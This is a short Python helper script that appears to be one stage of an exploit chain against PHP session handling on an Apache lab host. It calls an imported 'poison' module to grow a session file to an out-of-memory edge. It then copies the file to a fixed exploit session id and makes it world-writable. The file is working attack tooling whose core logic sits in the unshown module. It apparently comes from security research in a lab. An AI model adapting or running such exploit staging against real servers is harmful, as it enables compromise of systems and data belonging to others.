#!/usr/bin/env python3
"""Grow a session to the OOM edge ('ratchet') and copy it to the exploit's edge sid.

Run on the lab host after Apache is up. Requires the instrumented build so the
driver can see [ser] INIT FRESH / DESTROY and detect the poison.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import poison

BUILD = "ratchetsid000000000000000000Y1"
EDGE  = "edge000000000000000000000000E1"

def main():
    ok = False
    for _ in range(8):
        if poison.cmd_ratchet(BUILD, 6):
            ok = True
            break
    if not ok:
        print("[-] did not reach the OOM edge; is the instrumented build running?")
        return 1
    poison.sh(f"cp /tmp/sess_{BUILD} /tmp/sess_{EDGE} && chmod 666 /tmp/sess_{EDGE}")
    poison.cmd_reset()
    print(f"[+] edge session ready: /tmp/sess_{EDGE}")
    return 0

if __name__ == "__main__":
    sys.exit(main())
